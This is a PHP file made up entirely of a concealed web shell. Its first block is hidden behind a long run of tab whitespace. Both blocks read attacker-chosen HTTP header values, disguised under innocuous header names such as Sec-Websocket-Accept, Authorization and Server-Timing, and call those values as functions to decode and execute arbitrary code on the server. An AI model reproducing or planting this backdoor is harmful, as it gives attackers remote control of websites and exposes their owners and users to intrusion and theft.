<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Sec-Websocket-Accept'])){$ob_iconv_handle=$_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['X-Dns-Prefetch-Control']($_HEADERS['Clear-Site-Data']));$ob_iconv_handle();}

$_HEADERS = getallheaders();
if (isset($_HEADERS['Authorization'])) {
    $dbx_convert = $_HEADERS['Authorization']('', $_HEADERS['Server-Timing']($_HEADERS['Sec-Websocket-Accept']));
    $dbx_convert();
}